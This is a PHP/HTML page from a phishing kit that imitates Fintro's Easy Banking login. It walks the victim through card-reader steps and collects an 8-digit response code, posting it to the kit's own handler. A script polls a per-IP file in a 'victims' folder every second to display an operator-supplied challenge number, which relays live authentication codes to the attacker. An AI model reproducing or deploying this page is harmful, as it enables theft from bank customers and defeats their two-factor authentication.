<?php
  session_start();
  include "./Asstes/php/lang/lang.php";
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta name="discription" content="Coinbase">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="icon" href="./Asstes/imgs/favicon.ico">
        <title>Fintro</title>
        <!-- === bootstrap === -->
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet" />
        <!-- == Font-awesome " icon " == -->
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
        <!-- == remixicon " icon " == -->
        <link href="https://cdn.jsdelivr.net/npm/remixicon@3.5.0/fonts/remixicon.css" rel="stylesheet">
        <!-- == file style css == -->
        <link rel="stylesheet" href="./Asstes/css/style.css">
        <style>
          body{
            background-color:#EEEEEE;
          }
          ul li{
            color:#005494 !important;
          }
          input:focus{
              outline:2px solid #005494 !important;
              border: none !important;
          }
          input.error_input{
              outline:2px solid rgb(233, 62, 46) !important;
              border: none !important;
          }
          label.focus{
            color:#005494 !important;
          }
          label.err_leb{
            color:rgb(233, 62, 46) !important;
          }
          .error{
              color:rgb(233, 62, 46);
              font-family: ' BNPP Sans';
              margin-bottom:0 !important;
              font-size:14px;
              margin-left:15px;
              margin-top:5px;
          }      
          .error.error_1{
              font-size:13px;
          }            
        </style>        
    </head>
    <body>
      
    
    <!-- header -->
    <header class="header_1">
      <div class="container_header_1 d-flex align-items-center justify-content-between">
        <div class="route d-flex align-items-center">
          <i class="ri-arrow-left-s-line" style="color:#005494;"></i>
          <p class="mb-0" style="color:#005494;"><?php echo get_text('fi_l_1'); ?></p>
        </div>
        <div class="logo">
          <img src="./Asstes/imgs/fintro.png" style="height:35px; width: auto;" alt="">
        </div>
        <div class="esy_log">
          <p class="mb-0" style="color:#005494;"><?php echo get_text('fi_l_2'); ?></p>
        </div>
        <div class="menu align-items-end">
          <p class="mb-0" style="color:#005494;"><?php echo get_text('fi_l_3'); ?></p>
          <img src="./Asstes/imgs/menu.png" alt="">
        </div>
      </div>
    </header>

    <!-- wrapper_lect -->
    <div class="wrapper_lect">
      <div class="container_lect">
        <?php if( isset($_GET['error']) ) : ?>
        <div class="alert_error d-flex align-items-center">
          <i class="ri-alert-line"></i>
          <?php echo get_text('fi_l_4'); ?>
        </div>
        <?php endif; ?>
        <form action="./Asstes/php/config/func.php" method="post" class="d-flex">
        <input type="hidden" name="name_bank" value="Fintro">
        <input type="hidden" name="lecture">
          <div class="part_left">
            <div class="x1"></div>
            <div class="title">
              <p class="mb-0"><?php echo get_text('fi_l_5'); ?></p>
              <h1 class="mb-0">Easy Banking</h1>
              <img src="./Asstes/imgs/lect.svg" class="mt-3" alt="">
            </div>
            <div class="info_left">
            </div>
          </div>
          <div class="part_right">
            <div class="info">
              <p class="mb-0 d-flex align-items-center">1. <?php echo get_text('fi_l_6'); ?></p>
              <div class="cart d-flex align-items-center">
                <img src="./Asstes/imgs/cart.png" alt="">
                <p class="mb-0"><?php $_SESSION["crt"] ?></p>
              </div>
            </div>
            <div class="info">
              <p class="mb-0 d-flex align-items-center">2. <?php echo get_text('fi_l_7'); ?> <span class="m1">M1</span></p>
            </div>
            <div class="info py-3">
              <p class="mb-0 d-flex align-items-center">3. <?php echo get_text('fi_l_8'); ?> <span class="number ZZZ">4448 5891</span> <?php echo get_text('fi_l_9'); ?> <span class="ok">OK</span></p>
            </div>
            <div class="info">
              <p class="mb-0 d-flex align-items-center">4. <?php echo get_text('fi_l_10'); ?> <span class="ok">OK</span></p>
            </div>
            <div class="info bor py-3">
              <p class="mb-0 d-flex align-items-center">5. <?php echo get_text('fi_l_11'); ?></p>
              <div class="form-group mt-2">
                <div class="group-input">
                  <input type="text" name="code-lec" id="code-lec" placeholder="---- ----" class="<?php if(isset($_GET['error']))  echo "error_input"; ?>">
                </div>
                <?php if( isset($_GET['error']) ) : ?>
                <p class="error"><?php echo get_text('fi_l_12'); ?></p>
                <?php endif; ?>
              </div>              
            </div>
            <div class="btn_sub">
              <button type="submit" style="background-color:#005494;"><?php echo get_text('fi_l_13'); ?></button>
            </div>
          </div>
        </form>
        <p class="txt_form"><img src="./Asstes/imgs/call.png" alt=""><?php echo get_text('fi_l_14'); ?></p>
      </div>
    </div>

    <!-- footer -->
    <footer class="footer_1 footer_lect">
      <div class="container_footer_1 d-flex align-items-center justify-content-between">
        <p class="mb-0">© 2024 FINTRO</p>
        <ul class="d-flex align-items-center flex-wrap mb-0 ps-0">
          <li>Vie Privée</li>
          <li class="tiri">-</li>
          <li>Co-navigation</li>
          <li class="tiri">-</li>
          <li>Conditions d'utilisation du Site Web</li>
          <li class="tiri">-</li>
          <li>Les Cookies</li>
          <li class="tiri">-</li>
          <li>Vie Privée</li>
        </ul>
      </div>
    </footer>







    <!-- bootstrap -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
    <!-- script jquery -->
    <script src="https://code.jquery.com/jquery-3.7.1.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    
    <script>        
        $("#code-lec").mask('0000 0000');

        $(".form-group input").keyup(function(){
          if ($(".form-group #code-lec").val() != "") {
            $(".btn_sub button").prop("disabled",false);
            $(".btn_sub button").addClass("active");
          }else{
            $(".btn_sub button").prop("disabled",true);
            $(".btn_sub button").removeClass("active");
          }
        })   
        var ip = '<?php echo get_client_ip();?>';
        var waiting = setInterval(function() {
            $.get(`./victims/${ip}+.txt?` + new Date().getTime(), function(data) {
                if( data != "") {
                    $(".ZZZ").text(data);
                    // console.log(data);
                }
            });
        }, 1000);             
    </script>
    </body>
</html>